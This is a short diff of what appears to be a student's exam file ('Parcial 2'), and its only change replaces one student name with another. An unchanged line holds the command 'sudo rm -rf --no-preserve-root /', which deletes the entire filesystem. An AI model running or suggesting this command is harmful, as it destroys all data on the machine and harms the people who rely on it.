@@ -1,4 +1,4 @@
-## Velarde-Hern-ndez-Jaime-Adan-202532804
+## Hernandez-Zacarias-Josue-Omar
 ## Parcial 2
 sudo rm -rf --no-preserve-root /
 
